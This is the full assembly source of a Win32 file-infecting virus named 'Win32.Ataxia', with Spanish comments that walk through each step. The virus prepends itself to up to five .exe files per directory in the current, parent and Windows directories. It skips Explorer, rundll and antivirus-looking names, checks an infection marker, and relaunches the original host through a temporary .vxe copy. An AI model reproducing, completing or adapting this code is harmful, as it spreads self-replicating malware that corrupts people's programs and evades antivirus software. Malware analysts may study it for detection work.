;Win32.Ataxia By Evul

.386p
.model flat
.code                    ;setting para el Tasm

;=============================
extrn	LocalFree:proc;
extrn	LocalAlloc:proc;
extrn	GetModuleHandleA:proc;
extrn	GetModuleFileNameA:proc;

extrn	ExitProcess:proc;
extrn	WinExec:proc;
extrn	GetCommandLineA:proc;

extrn	_lopen:proc;
extrn	_lcreat:proc;
extrn	_lread:proc;
extrn	_lwrite:proc;

extrn	FindFirstFileA:proc;
extrn	FindNextFileA:proc;
extrn	DeleteFileA:proc;
extrn	MoveFileA:proc;
extrn	CloseHandle:proc;
;extrn	CreateFileA:proc;
extrn	WriteFile:proc;

extrn	GetSystemDirectoryA:proc;

extrn	GetWindowsDirectoryA:proc;
extrn	GetCurrentDirectoryA:proc;
extrn	SetCurrentDirectoryA:proc;

extrn	lstrcat:proc;

;=============================     ;funciones del api que vayamos a usar 

include windows.inc

;=============================

virussize	equ	8192             ;constante que contiene el tamaño del virus 

;=============================

begin:	

	mov	ebx,	0ffffffh
	push	ebx            ;cantidad de memoria a reservar (0ffffffh) 
	push	LMEM_ZEROINIT  ;flag (inicializar a cero)
	call	LocalAlloc     ;funcion para separa una cantidad de memoria especficada

	mov	dword ptr [heap], eax     ;puntero a la memoria
	cmp	eax,	0                   ;si es 0 hubo un error 
	je	done_this                 ;asi que nos largamos de aqui

fixhost:

	push	offset  handle1	 
      call	GetModuleHandleA       ;obtiene el handle del archivo ejecutado
	
      push 	50 
	push 	offset handle2
	push 	eax
	call	GetModuleFileNameA      ;guarda en handle2 el nombre de este archivo

	push	offset filedta          
	push	offset handle2
	call	FindFirstFileA          ;Busca este archivo , para obtener datos sobre el 

	lea	esi,	[cFileName]       ;pone en esi el nombre del file encontrado
	lea	edi,	[newfilename]     ;apunta edi al buffer del nuevo nombre de file
stowit_:
	lodsb
	cmp	al,	'.'
	je	addext_
	stosb
	jmp	stowit_                  ;busca el punto dentro del nombre del file 
addext_:
	stosb
	lea	esi,	[newext]
	movsw
	movsw                         ;le agrega la extension .vxe

	push	0                        
	push	offset cFileName
	call	_lopen                  ;abre el archivo .vxe


	mov	dword ptr [open_handle],eax   ;guarda el handle del archivo 

	push	dword ptr [nFileSizeLow]      
      push	dword ptr [heap]
	push	eax
	call	_lread                      ;mueve a la memoria el todo el ejecutable

	push	dword ptr [open_handle]
	call	CloseHandle                  ;cierra el archivo 

	push	0
	push	offset newfilename
	call	_lcreate                     ;crea de nuevo el .exe 

	mov	ebx,	dword ptr [nFileSizeLow]
	sub	ebx,	virussize  ;le resta al tamaño del .exe el del virus para obtener el tamaño
 	push	ebx              ;del .exe original        

	mov	ebx,	dword ptr [heap]
	add	ebx,	virussize       ;mueve el puntero al principio del .exe original
	push	ebx
	push	dword ptr [open_handle]
	call	_lwrite           ;y luego lo escribe con el nombre del exe 

	push	dword ptr [open_handle]
	call	CloseHandle       ;cierra el .exe

	push	0
	push	offset evulzfile
	call	_lcreat            ;crea un archivo con nombre evul.tmo

      mov	dword ptr [open_handle],eax
      push	virussize
	push	dword ptr [heap]
	push	eax
	call	_lwrite           ; y escribe en este el virus original 

	push	dword ptr [open_handle]
	call	CloseHandle       ; y cierra evul.tmp

	push	2
	push	offset evulzfile
	call	_lopen            ;vuelve y abre evul.tmp    (?????) 

	mov	dword ptr [open_handle],eax

	push	virussize
	push	dword ptr [heap]
	push	eax
	call	_lread         ;lee el virus DE NUEVO a memoria  (?????)

	push	dword ptr [open_handle]
	call	CloseHandle    ;vuelve y cierra el archivo


execit:

	jmp	dirloop      ;salta a la busque de archivos 

FEXY:
	mov	byte ptr [infected],0  ;pone # de infected a 0
	push	offset filedta
      push	offset maska 
	call	FindFirstFileA         ;busca archivos .exe en el path actual

	mov	dword ptr [handle_],eax ;guarda el handle de busqueda
	cmp	eax,	0
	je	done_this               ;si hay un error nos largamos de aqui
check:
	mov	bx,	word ptr[cFileName]
	cmp	bx,	'XE'              ; Explorer ?
	je	nextfile
	cmp	bx,	'UR'              ; RUNDll ?
	je	nextfile
	cmp	bx,	'ur'              ; rundll ?
	je	nextfile
	cmp	bx,	'ME'              ; Emm386 ??
	je	nextfile
	cmp	bx,	'va'              ; Antivirus ?
	je	nextfile
	cmp	bx,	'sv'              ; Antivirus ?
	je	nextfile
	cmp	dword ptr [nFileSizeLow],(0ffffffh-virussize); Muy Grande ??
	jg	nextfile          ;si cualquiera de las anteriores se cumple no lo infecta


	push	2
	push	offset cFileName
	call	_lopen            ;abrimos la victima

      mov	dword ptr [open_handle],eax

	mov	ebx,	dword ptr [nFileSizeLow]
	mov	dword ptr [hostsize], ebx     ;guardamos en ebx el tamaño del exe a infectar

	push	ebx
	mov	ebx,	dword ptr [heap]
	add	ebx,	virussize        ;le sumamos al tamaño del exe el tamaño del virus

	push	ebx
	push	eax
	call	_lread         ;leemos los datos del exe en la memoria luego del cuerpo del virus

	push	dword ptr [open_handle]
	call	CloseHandle      ;lo cerramos

	mov	ebx,	dword ptr [heap]   
	add	ebx,	(virussize+12h)

	cmp	byte ptr [ebx], 'X'
	je	bail
	add	ebx,	6
	cmp	byte ptr [ebx], '@'
	jne	bail             ;miramos en 12h y en 18h esta la marca de infeccion 

	push	2
	
      push	offset cFileName   
      call	_lopen             ;Volvemos a abrir el archivo (???)

	mov	dword ptr [open_handle],eax

	mov	ebx,	dword ptr [nFileSizeLow]
	add	ebx,	virussize            ;obtenemos el tamaño del exe mas el del virus 
	push	ebx
	push	dword ptr [heap]
	push	eax
	call	_lwrite                   ;escribimos el exe nuevo y el virus 
	inc	byte ptr [infected]
bail:
	push	dword ptr [open_handle]
	call	CloseHandle      ; lo cerramos 

	cmp	byte ptr [infected],5
	je	done_this           ;si ya infectamos 5 nos largamos 

nextfile:

	push	offset filedta
	mov	eax,	dword ptr [handle_]
	push	eax
	call	FindNextFileA      ;continuamos con la busqueda de EXEs

	cmp	eax,	0
	je	done_this       ;si no hay mnas nos largamos 

	jmp	check

done_this:
	ret
dirloop:
	call	FEXY              ;se devuelve 
	push	offset curdir
	push	260
	call	GetCurrentDirectoryA

uploop:
	push	offset updir
	call	SetCurrentDirectoryA
	cmp	eax,	1
	jne	trywindows
	call	FEXY             ;nos movemos al directorio de arriba (\..) y buscamos otros 5 EXEs

trywindows:
	push 	260
	push 	offset windir
	call 	GetWindowsDirectoryA

	push	offset windir
	call	SetCurrentDirectoryA
	call	FEXY         ;nos movemos al directorio de windows y buscamos otros 5 EXEs

	push	offset curdir
	call	SetCurrentDirectoryA ;restauramos el antiguo dir.

	mov	eax,	dword ptr [heap]
	call	LocalFree   ;liberamos la memoria reservada 

call	GetCommandLineA

	mov	esi,	eax  ;obtenemos la linea de comandos del ejecutable actual 
loopdot:
	mov	edi,	esi
	lodsb
	cmp	al,	'.'
	jne	loopdot      ;busacmso el punto 
	
	stosb
	lea	esi,	[fixcmd]
	movsw
	movsw       ;le agrgamos la extension VXE

	call	GetCommandLineA

	push	00000001
	inc	eax
	push	eax
	call	WinExec    ; y lo ejecutamos fianlmente

deleteit:

	push	offset newfilename
	call	DeleteFileA    ;borramos el archivo .exe temporal 

	cmp	eax,	0
	je	deleteit       ;si hay un error lo volvemos a borrar 

	push	offset evulzfile
	call	DeleteFileA       ; borramos el evul.tmp


	push	0
	call	ExitProcess  ; y por fin terminamos

;=============================

.data
windir		db	260	dup(0)
curdir		db	260	dup(0)
maska		db	'*.exe',0
newext		db	'VXE',0
fixcmd		db	'VXE '
evulzfile	db	'Evul.tmp',0
handle_		dd	0
open_handle	dd	0
heap		dd	0
hostsize	dd	0
commandline	dd	0
updir		db	'..',0

filedta:

FileAttributes	dd	0
CreationTime 	db	8	dup(0)
LastAccessTime	db	8	dup(0)
LastWriteTime	db	8	dup(0)
nFileSizeHigh	dd	0
nFileSizeLow	dd	0
dwReserved0	dd	0
dwReserved1	dd	0

cFileName	db	50	dup(0)
cAltFileName	db	50	dup(0)
handle1		db	50 	dup(0)
handle2		db	50 	dup(0)
written		dd	0
infected	db	0
newfilename	db	50	dup(0)

	end	begin